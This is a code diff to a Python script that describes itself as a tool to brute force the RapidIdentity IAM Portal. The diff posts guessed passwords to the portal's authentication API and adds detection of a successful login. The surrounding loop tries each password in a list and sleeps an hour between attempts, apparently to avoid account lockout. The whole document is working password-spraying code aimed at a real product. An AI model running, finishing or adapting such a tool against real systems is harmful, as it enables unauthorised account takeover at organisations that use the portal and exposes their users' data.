@@ -21,13 +21,17 @@ def guess_password(host, username, password):
     r3 = session.post('https://' + host + '/api/rest/authn', headers=headers, json=passwordJSON)
     result = json.loads(r3.text)
     #  Look for error message
-    if result["error"]["message"]:
+    try:
         error_message = result["error"]["message"]
         return error_message
     # If there is something other than an error message, print full response
     # I don't yet know what a success condition looks like
-    else:
-        return result
+    except KeyError:
+        try:
+            if result["type"] == "complete":
+                return "Authentication Success!"
+        except KeyError:
+            return result
 
 
 parser = argparse.ArgumentParser(description='This is a tool to brute force RapidIdentity IAM Portal')
@@ -48,4 +52,3 @@ for password in passlist:
         print("Tried " + user + ":" + password + " - " + result)
     print("Sleeping 1 hour between each password")
     time.sleep(3600)
-
